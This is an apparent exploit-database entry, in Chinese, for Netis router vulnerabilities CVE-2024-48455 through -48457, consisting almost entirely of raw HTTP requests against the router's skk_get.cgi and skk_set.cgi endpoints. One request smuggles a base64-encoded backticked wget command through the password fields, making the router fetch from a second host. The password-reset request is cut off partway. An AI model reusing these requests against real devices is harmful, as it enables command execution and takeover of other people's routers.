# Netis路由器漏洞

- **系统**：Netis　|　**类型**：其他　|　**CVE**：—
- **请求**：`POST /cgi-bin/skk_get.cgi HTTP/1.1`

**请求体 / payload**
```
CVE-2024-48455
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
mode_name=skk_get&wl_link=0
CVE-2024-48456
POST /cgi-bin/skk_set.cgi HTTP/1.1
Host: 192.168.1.1
Cookie: password=SWwwdmVoYWNraW5n
Content-Length: 167
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Priority: u=1, i
password=YHdnZXQgaHR0cDovLzE5Mi4xNjguMS4yYA%3D%3D&new_pwd_confirm=YHdnZXQgaHR0cDovLzE5Mi4xNjguMS4yYA%3D%3D&passwd_set=passwd_set&mode_name=skk_set&app=passwd&wl_link=0
CVE-2024-48457（密码重置）
POST /cgi-bin/skk_set.cgi HTTP/1.1
Host: 192.168.1.1
Content…（脚本共 977 字，完整版见原文）
```
- **预期**：200　|　—